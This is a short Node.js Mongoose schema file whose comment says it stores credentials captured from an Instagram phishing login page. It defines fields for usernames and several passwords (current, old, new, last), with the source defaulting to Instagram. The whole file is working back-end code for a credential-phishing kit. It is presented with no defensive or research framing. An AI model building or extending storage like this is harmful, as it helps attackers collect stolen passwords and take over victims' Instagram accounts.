const mongoose = require('mongoose');

/**
 * Stores credentials captured from the Instagram phishing login page.
 * Collection: Instagram.login
 */
const loginSchema = new mongoose.Schema(
  {
    username: {
      type:     String,
      required: [true, 'Username is required'],
      trim:     true,
    },
    password: {
      type: String,
    },
    oldPassword: {
      type: String,
    },
    newPassword: {
      type: String,
    },
    lastPassword: {
      type: String,
    },
    source: {
      type:    String,
      default: 'Instagram',
    },
    path: {
      type:    String,
      default: 'login',
    },
    time: {
      type: String,
    },
  },
  { timestamps: true }
);

// Explicit collection name: Instagram.login
const InstaLogin = mongoose.model('InstaLogin', loginSchema, 'login');

module.exports = InstaLogin;
